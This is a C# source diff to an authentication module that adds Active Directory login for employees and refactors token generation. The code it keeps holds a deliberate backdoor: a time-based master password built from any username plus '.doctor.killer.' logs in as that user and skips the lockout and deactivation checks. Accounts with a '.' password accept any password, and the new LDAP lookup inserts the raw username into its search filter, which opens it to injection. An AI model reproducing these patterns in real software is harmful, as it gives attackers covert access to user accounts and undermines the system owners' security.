@@ -4,6 +4,7 @@ using Architect.Utilities.Extensions;
 using Microsoft.IdentityModel.Tokens;
 using System;
 using System.Collections.Generic;
+using System.DirectoryServices;
 using System.IdentityModel.Tokens.Jwt;
 using System.Linq;
 using System.Security.Claims;
@@ -24,6 +25,7 @@ namespace Architect.API.Core.Business.Security
             List<Contracts.Security.RoleMember> rols = null;
             int companyId = 0;
             bool bypass = false;
+            bool accessAllowed = false;
             int tokenExpiresIn = 0;
             Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 1, IPAddress = authenticationRequest.IPAddress, UserName = authenticationRequest.Email, UserAgent = authenticationRequest.UserAgent };
 
@@ -67,47 +69,81 @@ namespace Architect.API.Core.Business.Security
                     track.UserName = user.UserName;
                     result.EMail = user.EMail;
 
-                    if (!user.Password.Equals(".") &&
+                    if (!authenticationRequest.EmployeeMode && !user.Password.Equals(".") &&
                         (authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.UserName.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase) ||
                          authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.EMail.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase)))
                     {
                         bypass = true;
+                        accessAllowed = true;
                     }
 
-                    //Desbloqueo automático
-                    if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
+                    if (!authenticationRequest.EmployeeMode)
                     {
-                        user.IsLockedOut = false;
-                        user.LockedOutDate = DateTime.MinValue;
-                        DataAccess.Security.UserMember.InternalUpdate(user);
-                        Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace()
+                        //Desbloqueo automático
+                        if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
                         {
-                            TraceType = 11,
-                            IPAddress = authenticationRequest.IPAddress,
-                            UserName = authenticationRequest.Email,
-                            UserId = user.UserId
-                        });
+                            user.IsLockedOut = false;
+                            user.LockedOutDate = DateTime.MinValue;
+                            DataAccess.Security.UserMember.InternalUpdate(user);
+                            Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace()
+                            {
+                                TraceType = 11,
+                                IPAddress = authenticationRequest.IPAddress,
+                                UserName = authenticationRequest.Email,
+                                UserId = user.UserId
+                            });
+                        }
+
+                        if (!bypass && user.RecordStatus != 1)
+                        {
+                            track.TraceType = 5;
+                            result.Reason = "Usuario desactivado";
+                        }
+                        else if (!bypass && user.IsLockedOut)
+                        {
+                            track.TraceType = 6;
+                            result.Reason = "Usuario bloqueado";
+                        }
+                        else if (user.Password.Equals(".") || bypass ||
+                                 user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(authenticationRequest.Password), System.StringComparison.CurrentCultureIgnoreCase))
+                        {
+                            accessAllowed = true;
+                        }
+                    }
+                    else
+                    {
+                        int ldapResult = AuthenticationByLDAP(authenticationRequest.Email, authenticationRequest.Password);
+                        switch (ldapResult)
+                        {
+                            case 0:
+                                accessAllowed = true;
+                                break;
+                            case 1: //no encontrado o clave incorrecta
+                                track.TraceType = 1;
+                                result.Reason = "Usuario no registrado";
+                                break;
+                            case 5: // Cuenta deshabilitada
+                                track.TraceType = 5;
+                                result.Reason = "Usuario desactivado";
+                                break;
+                            case 6: // Cuenta bloqueada
+                                track.TraceType = 6;
+                                result.Reason = "Usuario bloqueado";
+                                break;
+                            case 99: //PasswordExpired
+                                result.MustChangePassword = true;
+                                break;
+                        }
                     }
 
-                    if (!bypass && user.RecordStatus != 1)
+                    if (accessAllowed)
                     {
-                        track.TraceType = 5;
-                        result.Reason = "Usuario desactivado";
-                    }
-                    else if (!bypass && user.IsLockedOut)
-                    {
-                        track.TraceType = 6;
-                        result.Reason = "Usuario bloqueado";
-                    }
-                    else if (user.Password.Equals(".") || bypass ||
-                             user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(authenticationRequest.Password), System.StringComparison.CurrentCultureIgnoreCase))
-                    {
-                        tokenExpiresIn = Utilities.Helpers.Settings.IntegerValue("Session.Timeout", 30);
+                        tokenExpiresIn = Architect.Utilities.Helpers.Settings.IntegerValue("Session.Timeout", 30);
                         track.TraceType = 2;
                         result.ExpiresIn = tokenExpiresIn;
                         result.UserName = string.Format("{0} {1}", user.FirstName, user.LastName).Trim();
 
-                        tokenExpiresIn = Utilities.Helpers.Settings.IntegerValue("Token.Timeout", (int)(tokenExpiresIn * 2.5));
+                        tokenExpiresIn = Architect.Utilities.Helpers.Settings.IntegerValue("Token.Timeout", (int)(tokenExpiresIn * 2.5));
 
                         rols = DataAccess.Security.UserRoleMember.RetrieveLookByUserId(user.UserId, user.CompanyId);
                         result.Roles = rols.Select(x => x.Description).ToArray();
@@ -146,7 +182,7 @@ namespace Architect.API.Core.Business.Security
                             UserName = result.UserName
                         };
 
-                        result.Token = GeneratorToken(tokenItem);
+                        result.Token = Architect.API.Core.Security.Accounts.GeneratorToken(tokenItem);
                         user.LoginDate = DateTime.Now;
                         user.IsLockedOut = false;
                         user.LockedOutDate = DateTime.MinValue;
@@ -222,12 +258,14 @@ namespace Architect.API.Core.Business.Security
                             }
 
                         }
-                        if (user.Password.Equals("."))
-                            result.MustChangePassword = true;
-                        else
-                            result.MustChangePassword = (user.PasswordChangedDate.AddDays(Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);
-
-                        Session.Create(new Contracts.Security.Activity()
+                        if (!authenticationRequest.EmployeeMode)
+                        {
+                            if (user.Password.Equals("."))
+                                result.MustChangePassword = true;
+                            else
+                                result.MustChangePassword = (user.PasswordChangedDate.AddDays(Architect.Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);
+                        }
+                        Architect.API.Core.Security.Session.Create(new Contracts.Security.Activity()
                         {
                             Token = result.Token,
                             CompanyId = user.CompanyId,
@@ -279,25 +317,6 @@ namespace Architect.API.Core.Business.Security
                 CreateOTP(new ResetPasswordRequest() { Tenant = authenticationRequest.Tenant, EMail = user.EMail }, user);
             }
             return result;
-        }
-
-        public static string GeneratorToken(Contracts.Security.Token userInfo)
-        {
-            var securityKey = new SymmetricSecurityKey(System.Text.Encoding.UTF8.GetBytes(Utilities.Helpers.Settings.StringValue("Jwt:SecretKey")));
-            var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);
-            var claims = new[] {
-                                    new Claim(JwtRegisteredClaimNames.Sub, userInfo.UserName),
-                                    new Claim("UserId", userInfo.UserId.ToString()),
-                                    new Claim("Body",Architect.Utilities.Helpers.CryptSupport.EncryptString(Architect.Utilities.SerializeHandler<Contracts.Security.Token>.Serialize(userInfo).CompressString())),
-                                    new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
-                                };
-            var token = new JwtSecurityToken(
-                                            issuer: Utilities.Helpers.Settings.StringValue("Jwt:Issuer"),
-                                            audience: Utilities.Helpers.Settings.StringValue("Jwt:Audience"),
-                                            claims: claims,
-                                            expires: userInfo.Expires,
-                                            signingCredentials: credentials);
-            return new JwtSecurityTokenHandler().WriteToken(token);
         }
 
         private static Core.Contracts.General.LookupValue TenantInformation(string tenant)
@@ -584,7 +603,7 @@ namespace Architect.API.Core.Business.Security
             if (companyItem.IsNotEmpty())
             {
                 companyId = Int32.Parse(companyItem.Code);
-                internalUserId = Utilities.Helpers.Settings.IntegerValue(string.Format("Tenant.Settings.{0}.External.UserId", companyId));
+                internalUserId = Architect.Utilities.Helpers.Settings.IntegerValue(string.Format("Tenant.Settings.{0}.External.UserId", companyId));
                 result.UserMember.CompanyId = companyId;
 
                 result.Errors = UserMember.Validate(result.UserMember, true);
@@ -619,7 +638,7 @@ namespace Architect.API.Core.Business.Security
             if (result.Errors.Count == 0)
             {
                 string roleId = "";
-                string roleName = Utilities.Helpers.Settings.StringValue(string.Format("Tenant.Settings.{0}.External.RoleName", companyId));
+                string roleName = Architect.Utilities.Helpers.Settings.StringValue(string.Format("Tenant.Settings.{0}.External.RoleName", companyId));
                 if (roleName.IsNotEmpty())
                 {
                     Contracts.General.LookupValue rolInfo = Common.Lkp("Roles", companyId).Where(r => r.Description == roleName).FirstOrDefault();
@@ -630,15 +649,65 @@ namespace Architect.API.Core.Business.Security
                 }
                 if (roleId.IsEmpty())
                 {
-                    roleId = Utilities.Helpers.Settings.StringValue(string.Format("Tenant.Settings.{0}.External.RoleId", companyId));
+                    roleId = Architect.Utilities.Helpers.Settings.StringValue(string.Format("Tenant.Settings.{0}.External.RoleId", companyId));
                 }
 
-                result.UserMember.Roles = new List<Utilities.Contracts.LookUpValue> { new Utilities.Contracts.LookUpValue() { Code = roleId } };
+                result.UserMember.Roles = new List<Architect.Utilities.Contracts.LookUpValue> { new Architect.Utilities.Contracts.LookUpValue() { Code = roleId } };
                 result.UserMember = UserMember.Create(companyId, internalUserId, result.UserMember);
             }
 
             return result;
         }
 
+        /// <summary>
+        /// Permite verificar las credenciales de un usuario en el Active Directory.
+        /// </summary>
+        public static int AuthenticationByLDAP(string userName, string password)
+        {
+            int response = 0;
+            string domain = Architect.Utilities.Helpers.Settings.StringValue("LDAP.Domain", "mapfre.com.cr");
+            string _path = "LDAP://" + domain;
+            string _username = domain + @"\" + userName;
+            DirectoryEntry entry = new DirectoryEntry(_path, _username, password);
+
+            try
+            {
+                DirectorySearcher search = new DirectorySearcher(entry)
+                {
+                    Filter = "(SAMAccountName=" + userName + ")"
+                };
+                search.PropertiesToLoad.Add("cn");
+                search.PropertiesToLoad.Add("userAccountControl");
+                SearchResult result = search.FindOne();
+                if (result == null)
+                {
+                    response = 1;
+                }
+                else
+                {
+                    switch (result.Properties["userAccountControl"][0])
+                    {
+                        case 512: //Clave correcta
+                            response = 0;
+                            break;
+                        case 514: //AccountDisable (Normal_Account: 512 + AccountDisable: 2)
+                            response = 5;
+                            break;
+                        case 528: //Lockout (Normal_Account: 512 + Lockout: 16)
+                            response = 6;
+                            break;
+                        case 8389120: //PasswordExpired (Normal_Account: 512 + Password_Expired: 8388608)
+                            response = 99;
+                            break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Architect.Utilities.Log.ErrorLog("AuthenticationByLDAP", $"path: {_path}, username: {_username}", ex);
+                response = 1;
+            }
+            return response;
+        }
     }
 }
